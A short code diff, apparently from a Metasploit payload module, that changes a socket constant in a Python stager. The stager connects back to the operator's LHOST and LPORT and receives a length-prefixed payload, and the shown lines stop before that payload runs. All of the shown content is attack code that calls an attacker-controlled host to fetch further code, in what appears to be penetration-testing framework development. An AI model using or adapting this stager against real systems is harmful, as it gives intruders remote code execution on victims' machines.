@@ -32,7 +32,7 @@ module Metasploit3
     cmd = ''
     # Set up the socket
     cmd += "import socket,struct\n"
-    cmd += "s=socket.socket(2,1)\n" # socket.AF_INET = 2, socket.SOCK_STREAM = 1
+    cmd += "s=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
     cmd += "s.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
     cmd += "l=struct.unpack('>I',s.recv(4))[0]\n"
     cmd += "d=s.recv(4096)\n"
